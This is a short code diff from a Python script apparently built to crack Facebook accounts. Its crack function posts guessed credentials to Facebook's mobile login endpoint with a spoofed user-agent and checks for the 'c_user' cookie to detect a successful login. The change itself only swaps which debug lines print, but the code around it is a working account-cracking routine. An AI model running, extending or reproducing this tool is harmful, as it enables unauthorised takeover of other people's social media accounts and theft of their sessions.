@@ -165,7 +165,7 @@ def crack(uid, pww, total_idz):
             'user-agent': useragent_facebook(),
             'viewport-width': '980',}
             response = session.post('https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',headers=headers,data=data,allow_redirects=False) #proxies=proxs)
-            #print(data)
+            print(response)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
                 #kuki = convert(session.cookies.get_dict())
@@ -210,7 +210,7 @@ def crack(uid, pww, total_idz):
     except requests.exceptions.ConnectionError:
         time.sleep(20)
     except Exception as e:
-        print(f"\nError: {e}")
+        #print(f"\nError: {e}")
         pass
 menu()
  
